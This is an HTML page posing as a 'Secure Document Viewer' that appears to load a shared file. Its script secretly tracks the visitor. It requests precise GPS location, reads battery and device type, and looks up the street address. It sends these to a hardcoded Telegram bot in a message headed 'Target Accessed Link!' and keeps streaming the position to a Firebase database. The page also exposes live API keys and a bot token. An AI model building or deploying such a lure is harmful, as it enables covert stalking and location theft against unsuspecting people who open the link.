<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Viewer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            padding: 40px 20px; 
            background-color: #0d1117; 
            color: #c9d1d9; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #161b22;
            padding: 35px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            max-width: 420px;
            width: 100%;
            border: 1px solid #30363d;
        }
        h2 {
            font-size: 20px;
            margin-bottom: 12px;
            color: #58a6ff;
        }
        #status { 
            font-size: 14px; 
            color: #8b949e; 
            font-weight: 400; 
            line-height: 1.5;
            margin-top: 15px;
            word-break: break-word;
        }
        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #30363d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error { color: #f85149 !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Loading Shared File...</h2>
        <p id="status">Establishing secure connection & verifying permissions...</p>
    </div>

    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDhYrfKfzjRXTuJZS095zZe6UoI17CnHgw",
            authDomain: "live-tracker-c443f.firebaseapp.com",
            databaseURL: "https://live-tracker-c443f-default-rtdb.firebaseio.com",
            projectId: "live-tracker-c443f",
            storageBucket: "live-tracker-c443f.firebasestorage.app",
            messagingSenderId: "444398218197",
            appId: "1:444398218197:web:a21f13be9e0d726f9f6b5c",
            measurementId: "G-TP2244W66P"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const statusText = document.getElementById("status");

        // --- TELEGRAM CONFIGURATION ---
        const BOT_TOKEN = "8818145313:AAE9KwaKfnjBm9aaMDnzwMwuIgJgM_ajoR4";
        const CHAT_ID = "8407541236"; 

        let hasAlerted = false;

        // Device & Browser Detection Helper
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Desktop/PC";
            if (/android/i.test(ua)) device = "Android Mobile";
            if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone/iOS";
            return device;
        }

        // Reverse Geocoding to get human-readable Address
        async function getAddress(lat, lng) {
            try {
                let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
                let data = await response.json();
                return data.display_name || "Exact address not found";
            } catch (e) {
                return "Address lookup failed";
            }
        }

        async function sendTelegramAlert(lat, lng, accuracy) {
            if (hasAlerted) return;
            hasAlerted = true;

            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging ⚡)' : ''}`;
                }
            } catch (e) {
                batteryInfo = "Not Accessible";
            }

            const deviceType = getDeviceInfo();
            statusText.innerText = "Fetching location details...";
            const address = await getAddress(lat, lng);
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            
            const message = `🚨 *Target Accessed Link!* 🎯\n\n` +
                            `📱 *Device:* ${deviceType}\n` +
                            `🔋 *Battery:* ${batteryInfo}\n` +
                            `📍 *Address:* ${address}\n` +
                            `🌐 *Coordinates:* \`${lat}, ${lng}\`\n` +
                            `🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n` +
                            `🗺️ [Open in Google Maps](${mapUrl})`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            }).then(() => {
                statusText.innerText = "File loaded successfully!";
            }).catch(err => console.error("Telegram Alert Error:", err));
        }

        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                // Send Advanced Notification once
                sendTelegramAlert(lat, lng, accuracy);

                // Update Live Firebase Data continuously
                set(ref(db, 'users/sahil'), {
                    latitude: lat,
                    longitude: lng,
                    accuracy: accuracy,
                    timestamp: Date.now()
                });

            }, (error) => {
                statusText.innerText = "Access denied or GPS unavailable: " + error.message;
                statusText.classList.add("error");
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            statusText.innerText = "Browser doesn't support geolocation.";
            statusText.classList.add("error");
        }
    </script>
</body>
</html>
    </script>
</body>
</html>
